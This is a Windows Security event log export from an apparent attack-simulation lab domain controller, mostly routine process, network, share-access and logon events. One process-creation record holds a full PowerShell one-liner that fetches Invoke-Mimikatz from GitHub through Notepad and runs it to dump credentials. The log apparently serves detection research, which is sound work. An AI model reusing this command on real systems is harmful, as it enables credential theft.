Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382177
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1744
	New Process Name:	C:\Windows\System32\notepad.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1014
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	Notepad

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:53:35 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382176
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1014
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1698
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" & {$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\Software\Microsoft\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr} 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:53:35 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382175
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55123
	Destination Address:	10.0.1.12
	Destination Port:		8000
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:35 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382174
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55123
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:53:35 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382173
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x1ba4
	Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Exit Status:	0x0
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382210
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		61113
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382209
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		::1
	Source Port:		63816
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382208
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		63816
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382207
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		63816
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5145
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Detailed File Share
OpCode=Info
RecordNumber=1382206
Keywords=Audit Success
Message=A network share object was checked to see whether client can be granted desired access.
	
Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Network Information:	
	Object Type:		File
	Source Address:		::1
	Source Port:		55124
	
Share Information:
	Share Name:		\\*\C$
	Share Path:		\??\C:\
	Relative Target Name:	Users\Administrator\Documents

Access Request Information:
	Access Mask:		0x100081
	Accesses:		SYNCHRONIZE
				ReadData (or ListDirectory)
				ReadAttributes
				
Access Check Results:
	-
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5145
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Detailed File Share
OpCode=Info
RecordNumber=1382205
Keywords=Audit Success
Message=A network share object was checked to see whether client can be granted desired access.
	
Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Network Information:	
	Object Type:		File
	Source Address:		::1
	Source Port:		55124
	
Share Information:
	Share Name:		\\*\C$
	Share Path:		\??\C:\
	Relative Target Name:	\

Access Request Information:
	Access Mask:		0x100080
	Accesses:		SYNCHRONIZE
				ReadAttributes
				
Access Check Results:
	-
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5145
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Detailed File Share
OpCode=Info
RecordNumber=1382204
Keywords=Audit Success
Message=A network share object was checked to see whether client can be granted desired access.
	
Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Network Information:	
	Object Type:		File
	Source Address:		::1
	Source Port:		55124
	
Share Information:
	Share Name:		\\*\C$
	Share Path:		\??\C:\
	Relative Target Name:	\

Access Request Information:
	Access Mask:		0x100080
	Accesses:		SYNCHRONIZE
				ReadAttributes
				
Access Check Results:
	-
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5145
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Detailed File Share
OpCode=Info
RecordNumber=1382203
Keywords=Audit Success
Message=A network share object was checked to see whether client can be granted desired access.
	
Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Network Information:	
	Object Type:		File
	Source Address:		::1
	Source Port:		55124
	
Share Information:
	Share Name:		\\*\C$
	Share Path:		\??\C:\
	Relative Target Name:	\

Access Request Information:
	Access Mask:		0x100080
	Accesses:		SYNCHRONIZE
				ReadAttributes
				
Access Check Results:
	-
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5145
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Detailed File Share
OpCode=Info
RecordNumber=1382202
Keywords=Audit Success
Message=A network share object was checked to see whether client can be granted desired access.
	
Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Network Information:	
	Object Type:		File
	Source Address:		::1
	Source Port:		55124
	
Share Information:
	Share Name:		\\*\C$
	Share Path:		\??\C:\
	Relative Target Name:	\

Access Request Information:
	Access Mask:		0x100080
	Accesses:		SYNCHRONIZE
				ReadAttributes
				
Access Check Results:
	-
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5145
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Detailed File Share
OpCode=Info
RecordNumber=1382201
Keywords=Audit Success
Message=A network share object was checked to see whether client can be granted desired access.
	
Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Network Information:	
	Object Type:		File
	Source Address:		::1
	Source Port:		55124
	
Share Information:
	Share Name:		\\*\C$
	Share Path:		\??\C:\
	Relative Target Name:	Users

Access Request Information:
	Access Mask:		0x100080
	Accesses:		SYNCHRONIZE
				ReadAttributes
				
Access Check Results:
	-
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5145
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Detailed File Share
OpCode=Info
RecordNumber=1382200
Keywords=Audit Success
Message=A network share object was checked to see whether client can be granted desired access.
	
Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Network Information:	
	Object Type:		File
	Source Address:		::1
	Source Port:		55124
	
Share Information:
	Share Name:		\\*\C$
	Share Path:		\??\C:\
	Relative Target Name:	Users

Access Request Information:
	Access Mask:		0x100080
	Accesses:		SYNCHRONIZE
				ReadAttributes
				
Access Check Results:
	-
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5145
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Detailed File Share
OpCode=Info
RecordNumber=1382199
Keywords=Audit Success
Message=A network share object was checked to see whether client can be granted desired access.
	
Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Network Information:	
	Object Type:		File
	Source Address:		::1
	Source Port:		55124
	
Share Information:
	Share Name:		\\*\C$
	Share Path:		\??\C:\
	Relative Target Name:	Users

Access Request Information:
	Access Mask:		0x100080
	Accesses:		SYNCHRONIZE
				ReadAttributes
				
Access Check Results:
	-
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5145
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Detailed File Share
OpCode=Info
RecordNumber=1382198
Keywords=Audit Success
Message=A network share object was checked to see whether client can be granted desired access.
	
Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Network Information:	
	Object Type:		File
	Source Address:		::1
	Source Port:		55124
	
Share Information:
	Share Name:		\\*\C$
	Share Path:		\??\C:\
	Relative Target Name:	Users

Access Request Information:
	Access Mask:		0x100080
	Accesses:		SYNCHRONIZE
				ReadAttributes
				
Access Check Results:
	-
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5145
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Detailed File Share
OpCode=Info
RecordNumber=1382197
Keywords=Audit Success
Message=A network share object was checked to see whether client can be granted desired access.
	
Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Network Information:	
	Object Type:		File
	Source Address:		::1
	Source Port:		55124
	
Share Information:
	Share Name:		\\*\C$
	Share Path:		\??\C:\
	Relative Target Name:	Users\Administrator

Access Request Information:
	Access Mask:		0x100080
	Accesses:		SYNCHRONIZE
				ReadAttributes
				
Access Check Results:
	-
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5145
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Detailed File Share
OpCode=Info
RecordNumber=1382196
Keywords=Audit Success
Message=A network share object was checked to see whether client can be granted desired access.
	
Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Network Information:	
	Object Type:		File
	Source Address:		::1
	Source Port:		55124
	
Share Information:
	Share Name:		\\*\C$
	Share Path:		\??\C:\
	Relative Target Name:	Users\Administrator

Access Request Information:
	Access Mask:		0x100080
	Accesses:		SYNCHRONIZE
				ReadAttributes
				
Access Check Results:
	-
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5145
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Detailed File Share
OpCode=Info
RecordNumber=1382195
Keywords=Audit Success
Message=A network share object was checked to see whether client can be granted desired access.
	
Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Network Information:	
	Object Type:		File
	Source Address:		::1
	Source Port:		55124
	
Share Information:
	Share Name:		\\*\C$
	Share Path:		\??\C:\
	Relative Target Name:	Users\Administrator

Access Request Information:
	Access Mask:		0x100080
	Accesses:		SYNCHRONIZE
				ReadAttributes
				
Access Check Results:
	-
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5145
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Detailed File Share
OpCode=Info
RecordNumber=1382194
Keywords=Audit Success
Message=A network share object was checked to see whether client can be granted desired access.
	
Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Network Information:	
	Object Type:		File
	Source Address:		::1
	Source Port:		55124
	
Share Information:
	Share Name:		\\*\C$
	Share Path:		\??\C:\
	Relative Target Name:	Users\Administrator

Access Request Information:
	Access Mask:		0x100080
	Accesses:		SYNCHRONIZE
				ReadAttributes
				
Access Check Results:
	-
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5145
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Detailed File Share
OpCode=Info
RecordNumber=1382193
Keywords=Audit Success
Message=A network share object was checked to see whether client can be granted desired access.
	
Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Network Information:	
	Object Type:		File
	Source Address:		::1
	Source Port:		55124
	
Share Information:
	Share Name:		\\*\C$
	Share Path:		\??\C:\
	Relative Target Name:	Users\Administrator\Documents

Access Request Information:
	Access Mask:		0x100080
	Accesses:		SYNCHRONIZE
				ReadAttributes
				
Access Check Results:
	-
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5145
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Detailed File Share
OpCode=Info
RecordNumber=1382192
Keywords=Audit Success
Message=A network share object was checked to see whether client can be granted desired access.
	
Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Network Information:	
	Object Type:		File
	Source Address:		::1
	Source Port:		55124
	
Share Information:
	Share Name:		\\*\C$
	Share Path:		\??\C:\
	Relative Target Name:	Users\Administrator\Documents

Access Request Information:
	Access Mask:		0x100080
	Accesses:		SYNCHRONIZE
				ReadAttributes
				
Access Check Results:
	-
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5145
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Detailed File Share
OpCode=Info
RecordNumber=1382191
Keywords=Audit Success
Message=A network share object was checked to see whether client can be granted desired access.
	
Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Network Information:	
	Object Type:		File
	Source Address:		::1
	Source Port:		55124
	
Share Information:
	Share Name:		\\*\C$
	Share Path:		\??\C:\
	Relative Target Name:	Users\Administrator\Documents

Access Request Information:
	Access Mask:		0x100080
	Accesses:		SYNCHRONIZE
				ReadAttributes
				
Access Check Results:
	-
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5145
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Detailed File Share
OpCode=Info
RecordNumber=1382190
Keywords=Audit Success
Message=A network share object was checked to see whether client can be granted desired access.
	
Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Network Information:	
	Object Type:		File
	Source Address:		::1
	Source Port:		55124
	
Share Information:
	Share Name:		\\*\C$
	Share Path:		\??\C:\
	Relative Target Name:	Users\Administrator\Documents

Access Request Information:
	Access Mask:		0x100080
	Accesses:		SYNCHRONIZE
				ReadAttributes
				
Access Check Results:
	-
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5145
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Detailed File Share
OpCode=Info
RecordNumber=1382189
Keywords=Audit Success
Message=A network share object was checked to see whether client can be granted desired access.
	
Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Network Information:	
	Object Type:		File
	Source Address:		::1
	Source Port:		55124
	
Share Information:
	Share Name:		\\*\C$
	Share Path:		\??\C:\
	Relative Target Name:	Users\Administrator\Documents

Access Request Information:
	Access Mask:		0x100081
	Accesses:		SYNCHRONIZE
				ReadData (or ListDirectory)
				ReadAttributes
				
Access Check Results:
	-
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5140
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=File Share
OpCode=Info
RecordNumber=1382188
Keywords=Audit Success
Message=A network share object was accessed.
	
Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Network Information:	
	Object Type:		File
	Source Address:		::1
	Source Port:		55124
	
Share Information:
	Share Name:		\\*\C$
	Share Path:		\??\C:\

Access Request Information:
	Access Mask:		0x1
	Accesses:		ReadData (or ListDirectory)
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4634
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Logoff
OpCode=Info
RecordNumber=1382187
Keywords=Audit Success
Message=An account was logged off.

Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x4FE3D6B

Logon Type:			3

This event is generated when a logon session is destroyed. It may be positively correlated with a logon event using the Logon ID value. Logon IDs are only unique between reboots on the same computer.
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4624
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Logon
OpCode=Info
RecordNumber=1382186
Keywords=Audit Success
Message=An account was successfully logged on.

Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Information:
	Logon Type:		3
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE.LOCAL
	Logon ID:		0x4FE3D6B
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{08660350-345C-DC9E-6370-9808B2DB6D2D}

Process Information:
	Process ID:		0x0
	Process Name:		-

Network Information:
	Workstation Name:	-
	Source Network Address:	fe80::6167:9038:1edc:47d4
	Source Port:		55125

Detailed Authentication Information:
	Logon Process:		Kerberos
	Authentication Package:	Kerberos
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4672
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Special Logon
OpCode=Info
RecordNumber=1382185
Keywords=Audit Success
Message=Special privileges assigned to new logon.

Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x4FE3D6B

Privileges:		SeSecurityPrivilege
			SeBackupPrivilege
			SeRestorePrivilege
			SeTakeOwnershipPrivilege
			SeDebugPrivilege
			SeSystemEnvironmentPrivilege
			SeLoadDriverPrivilege
			SeImpersonatePrivilege
			SeDelegateSessionUserImpersonatePrivilege
			SeEnableDelegationPrivilege
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382184
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		852
	Application Name:	\device\harddiskvolume1\windows\system32\lsass.exe

Network Information:
	Direction:		Inbound
	Source Address:		fe80::6167:9038:1edc:47d4
	Source Port:		55125
	Destination Address:	fe80::6167:9038:1edc:47d4
	Destination Port:		389
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	65786
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	46
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382183
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2724
	Application Name:	\device\harddiskvolume1\windows\system32\dfssvc.exe

Network Information:
	Direction:		Outbound
	Source Address:		fe80::6167:9038:1edc:47d4
	Source Port:		55125
	Destination Address:	fe80::6167:9038:1edc:47d4
	Destination Port:		389
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382182
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2724
	Application Name:	\device\harddiskvolume1\windows\system32\dfssvc.exe

Network Information:
	Source Address:		::
	Source Port:		55125
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5140
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=File Share
OpCode=Info
RecordNumber=1382181
Keywords=Audit Success
Message=A network share object was accessed.
	
Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Network Information:	
	Object Type:		File
	Source Address:		::1
	Source Port:		55124
	
Share Information:
	Share Name:		\\*\IPC$
	Share Path:		

Access Request Information:
	Access Mask:		0x1
	Accesses:		ReadData (or ListDirectory)
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382180
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		4
	Application Name:	System

Network Information:
	Direction:		Inbound
	Source Address:		::1
	Source Port:		55124
	Destination Address:	::1
	Destination Port:		445
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	65786
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	46
03/01/2021 10:53:36 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382179
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		4
	Application Name:	System

Network Information:
	Direction:		Outbound
	Source Address:		::1
	Source Port:		55124
	Destination Address:	::1
	Destination Port:		445
	Protocol:		6

